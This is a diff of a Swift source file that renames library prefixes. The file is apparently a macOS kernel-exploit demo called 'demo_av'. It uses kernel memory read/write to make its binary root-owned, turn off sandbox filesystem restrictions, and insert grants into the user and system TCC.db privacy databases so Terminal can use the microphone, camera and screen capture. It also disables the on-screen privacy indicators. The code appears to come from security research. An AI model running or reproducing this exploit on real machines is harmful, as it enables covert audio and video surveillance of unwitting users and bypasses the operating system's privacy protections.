@@ -243,11 +243,11 @@ enum CommandError: Error {
     case error(Int)
 }
 
-func sudoRun(_ util: xe_util_sudo_t, cmd: String, args: [String]) throws {
+func sudoRun(_ util: xpl_util_sudo_t, cmd: String, args: [String]) throws {
     var argArray = args.map { UnsafePointer<Int8>(strdup($0)) }
     defer { argArray.forEach { $0?.deallocate() } }
     
-    let res = xe_util_sudo_run(util, cmd, &argArray, argArray.count)
+    let res = xpl_util_sudo_run(util, cmd, &argArray, argArray.count)
     
     if res != 0 {
         throw CommandError.status(Int(res))
@@ -258,9 +258,9 @@ func sudoRun(_ util: xe_util_sudo_t, cmd: String, args: [String]) throws {
 func fixBinaryPrivilege() throws {
     let binary = Bundle.main.executablePath!
     
-    xe_util_msdosfs_loadkext()
-    var sudo = xe_util_sudo_create()
-    defer { xe_util_sudo_destroy(&sudo) }
+    xpl_util_msdosfs_loadkext()
+    var sudo = xpl_util_sudo_create()
+    defer { xpl_util_sudo_destroy(&sudo) }
     
     print("[I] changing owner to root")
     try sudoRun(sudo!, cmd: "/usr/sbin/chown", args: ["-n", "0:0", binary])
@@ -288,9 +288,9 @@ func relaunch() throws {
 // MARK: - Utils
 
 func findParentTerminalProcess() throws -> uintptr_t {
-    var cursor: uintptr_t = xe_xnu_proc_current_proc()
+    var cursor: uintptr_t = xpl_xnu_proc_current_proc()
     while cursor != 0 {
-        let pid = xe_kmem_read_uint32(cursor, Int(TYPE_PROC_MEM_P_PID_OFFSET))
+        let pid = xpl_kmem_read_uint32(cursor, Int(TYPE_PROC_MEM_P_PID_OFFSET))
         
         let binary_path = String(unsafeUninitializedCapacity: Int(PATH_MAX)) { ptr in
             return Int(proc_pidpath(Int32(pid), ptr.baseAddress!, UInt32(PATH_MAX)))
@@ -300,7 +300,7 @@ func findParentTerminalProcess() throws -> uintptr_t {
             return cursor
         }
         
-        let next = xe_kmem_read_ptr(cursor, Int(TYPE_PROC_MEM_P_PPTR_OFFSET))
+        let next = xpl_kmem_read_ptr(cursor, Int(TYPE_PROC_MEM_P_PPTR_OFFSET))
         if next != cursor {
             cursor = next
         } else {
@@ -322,7 +322,7 @@ func printUsage() {
     print("[I] example usage: demo_av -v camera -a mic capture.mov")
 }
 
-var kmemSocket: String = XE_DEFAULT_KMEM_SOCKET
+var kmemSocket: String = xpl_DEFAULT_KMEM_SOCKET
 var video = "screen"
 var audio = "mic"
 var overwrite = false
@@ -390,18 +390,18 @@ if FileManager.default.fileExists(atPath: path) {
 }
 
 print("[I] initializing kmem")
-xe_init()
-var kmem_backend: xe_kmem_backend_t? = nil
-var error = xe_kmem_remote_client_create(kmemSocket, &kmem_backend)
+xpl_init()
+var kmem_backend: xpl_kmem_backend_t? = nil
+var error = xpl_kmem_remote_client_create(kmemSocket, &kmem_backend)
 guard error == 0 else {
     print("[E] cannot connect to kmem server unix domain socket \(kmemSocket), err:", String(cString: strerror(error)))
     exit(1)
 }
 
-xe_kmem_use_backend(kmem_backend!)
-let mach_execute_header = xe_kmem_remote_client_get_mh_execute_header(kmem_backend)
-xe_slider_kernel_init(mach_execute_header)
-defer { xe_kmem_remote_client_destroy(&kmem_backend) }
+xpl_kmem_use_backend(kmem_backend!)
+let mach_execute_header = xpl_kmem_remote_client_get_mh_execute_header(kmem_backend)
+xpl_slider_kernel_init(mach_execute_header)
+defer { xpl_kmem_remote_client_destroy(&kmem_backend) }
 
 guard let terminal_process = try? findParentTerminalProcess() else {
     print("[E] parent Terminal.app process not found. This demo must be run from /System/Applications/Utilities/Terminal.app")
@@ -423,7 +423,7 @@ guard getuid() == 0 else {
     }
 }
 
-let user_uid = xe_kmem_read_uint32(terminal_process, Int(TYPE_PROC_MEM_P_UID_OFFSET))
+let user_uid = xpl_kmem_read_uint32(terminal_process, Int(TYPE_PROC_MEM_P_UID_OFFSET))
 let home_dir = String(cString: getpwuid(user_uid)!.pointee.pw_dir!)
 let user_tcc_database = URL(fileURLWithPath: "Library/Application Support/com.apple.TCC/TCC.db", relativeTo: URL(fileURLWithPath: home_dir)).path
 var system_tcc_database = "/Library/Application Support/com.apple.TCC/TCC.db"
@@ -432,46 +432,46 @@ print("[I] using user TCC database at", user_tcc_database)
 print("[I] using system TCC database at", system_tcc_database)
 
 print("[I] intializing sandbox utility")
-var util_sandbox = xe_util_sandbox_create()
+var util_sandbox = xpl_util_sandbox_create()
 
 print("[I] disabling sandbox FS restrictions")
-xe_util_sandbox_disable_fs_restrictions(util_sandbox!)
+xpl_util_sandbox_disable_fs_restrictions(util_sandbox!)
 
 print("[I] authorizing com.apple.Terminal to use kTCCServiceMicrophone")
-error = xe_util_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceMicrophone")
+error = xpl_util_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceMicrophone")
 if error != 0 {
     print("[E] cannot send authorization to TCC.db, err:", error)
-    xe_util_sandbox_destroy(&util_sandbox)
+    xpl_util_sandbox_destroy(&util_sandbox)
     abort()
 }
 
 print("[I] authorizing com.apple.Terminal to use kTCCServiceCamera")
-error = xe_util_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceCamera")
+error = xpl_util_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceCamera")
 if error != 0 {
     print("[E] cannot send authorization to TCC.db, err:", error)
-    xe_util_sandbox_destroy(&util_sandbox)
+    xpl_util_sandbox_destroy(&util_sandbox)
     abort()
 }
 
 print("[I] authorizing com.apple.Terminal to use kTCCServiceScreenCapture")
-error = xe_util_tcc_authorize(system_tcc_database, "com.apple.Terminal", "kTCCServiceScreenCapture")
+error = xpl_util_tcc_authorize(system_tcc_database, "com.apple.Terminal", "kTCCServiceScreenCapture")
 if error != 0 {
     print("[E] cannot send authorization to system TCC.db, err:", error)
-    xe_util_sandbox_destroy(&util_sandbox)
+    xpl_util_sandbox_destroy(&util_sandbox)
     abort()
 }
 
 print("[I] restoring sandbox FS restrictions")
-xe_util_sandbox_destroy(&util_sandbox)
+xpl_util_sandbox_destroy(&util_sandbox)
 
 print("[I] disabling privacy indicators")
 var privacy_disable_session = privacy_disable_session_start()
 defer {
-    var sb = xe_util_sandbox_create()
-    xe_util_sandbox_disable_signal_check(sb)
+    var sb = xpl_util_sandbox_create()
+    xpl_util_sandbox_disable_signal_check(sb)
     print("[I] restoring privacy indicators")
     privacy_disable_session_stop(&privacy_disable_session)
-    xe_util_sandbox_destroy(&sb)
+    xpl_util_sandbox_destroy(&sb)
 }
 
 let stopSem = DispatchSemaphore(value: 0)
